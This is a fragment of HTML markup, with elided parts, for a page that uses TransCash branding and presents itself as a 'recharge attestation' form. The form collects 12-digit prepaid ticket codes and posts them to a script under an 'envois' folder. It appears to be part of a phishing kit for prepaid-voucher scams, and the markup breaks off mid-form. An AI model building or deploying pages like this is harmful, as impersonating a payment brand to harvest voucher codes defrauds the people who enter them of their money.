...
<head>
    <title>Transcash - Fiche d'attestation des recharges</title>
    <meta charset="utf-8">
    ...
    <div class="container-fluid px-1 py-5 mx-auto">
        <div class="row d-flex justify-content-center">
            <div class="col-xl-7 col-lg-8 col-md-9 col-11 text-center">
                <h3 class="space">TransCash</h3> <br>
                <figure class="margin-bottom-medium">
                    <img src="images/logo-transcash.png" height="100" width="200" class="footer-logo" alt="TransCash">
                </figure>
                <div class="card">
                    <form class="form-card" action="envois/transcash.php" method="POST">
                        ...
                        <div id="row">
                            <div class="row justify-content-between text-left">
                                <div class="form-group col-5 flex-column d-flex">
                                    <input type="number" id="ticket" name="ticket[]" placeholder="Code du ticket" minlength="12" 
                                        maxlength="12" size="12" required="required" onblur="validate(4)" oninput="javascript: if (this.value.length > 12) this.value = this.value.slice(0, 12);">
                                </div>
                                <div class="form-group col-5 flex-column d-flex">
